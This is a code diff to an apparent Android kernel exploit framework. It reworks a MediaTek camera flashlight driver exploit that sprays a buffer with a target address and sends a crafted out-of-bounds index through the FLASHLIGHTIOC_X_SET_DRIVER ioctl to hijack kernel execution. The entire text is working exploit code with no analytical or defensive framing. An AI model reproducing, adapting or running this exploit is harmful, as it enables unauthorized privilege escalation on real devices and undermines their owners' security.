@@ -187,6 +187,7 @@ static void mtk_camera_isp_free(void **opaque) {
     fd = (int)(*opaque);
     if (fd >= 0)
         close(fd);
+    *opaque = (void *) -1;
 }
 
 static int mtk_camera_isp_write32(void *opaque, long addr, long val) {
@@ -225,51 +226,41 @@ struct private_data_camera_fl {
     void *mapped;
 };
 
-static int mtk_camera_fl_init(void **opaque) {
-    struct private_data_camera_fl *p;
+// XXX: why mmap ANONYMOUS | FIXED | SHARED not working???
+// kernel is about server MB
+static long fl_fake_init[16 * 1024 * 1024 / sizeof(long)];
 
-    p = (struct private_data_camera_fl *) malloc(sizeof(*p));
-    if (!p)
+static int mtk_camera_fl_init(void **opaque) {
+    int fd;
+
+    *opaque = (void *) -1;
+    fd = open("/dev/kd_camera_flashlight", O_RDWR);
+    if (fd < 0)
         return -1;
-    p->fd = open("/dev/kd_camera_flashlight", O_RDWR);
-    if (p->fd < 0)
-        goto bail_open;
-    // assume 0x20000000~0x2ffffffff is not used
-    p->mapped = mmap((void *) 0x20000000, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, 0, 0);
-    if (p->mapped == MAP_FAILED)
-        goto bail_mmap;
-    *opaque = p;
+    *opaque = (void *) fd;
     return 0;
-bail_mmap:
-    close(p->fd);
-bail_open:
-    free(p);
-    return -1;
 }
 
 static int mtk_camera_fl_invoke(void *opaque, long addr) {
-    struct private_data_camera_fl *p = (struct private_data_camera_fl *) opaque;
-    int rc, i, idx;
+    int rc, fd, i, idx;
 
+    fd = (int) opaque;
+    for (i = 0; i < sizeof(fl_fake_init) / sizeof(fl_fake_init[0]); i++)
+        fl_fake_init[i] = addr;
     // assume kernel is at 0xc0000000
-    // assume sizeof(KD_FLASHLIGHT_INIT_FUNCTION_STRUCT) == 8
-    for (i = 0; i < 0x10000000; i += sizeof(long)) {
-        *((long *) p->mapped + i) = addr;
-    }
-    msync(p->mapped, 0x10000000, MS_SYNC);
-    idx = 0x60000000 / 8; // 0x100000000 - 0xc0000000 + 0x2000000
-    rc = ioctl(p->fd, FLASHLIGHTIOC_X_SET_DRIVER, &idx);
-    return rc == -EIO ? 0 : -1;
+    idx = (0x40000000 + (unsigned int) &fl_fake_init[0]) >> 3;
+    rc = ioctl(fd, FLASHLIGHTIOC_X_SET_DRIVER, idx);
+    return rc;
 }
 
 static void mtk_camera_fl_free(void **opaque) {
-    struct private_data_camera_fl *p = (struct private_data_camera_fl *)(*opaque);
-
-    munmap(p->mapped, 0x10000000);
-    close(p->fd);
+    if ((int)(*opaque) >= 0)
+        close((int)(*opaque));
+    *opaque = (void *) -1;
 }
 
 exploit_t EXPLOIT_mtk_camera_fl = {
+    .name = "MTK flashlight",
     .init = mtk_camera_fl_init,
     .invoke = mtk_camera_fl_invoke,
     .free = mtk_camera_fl_free,
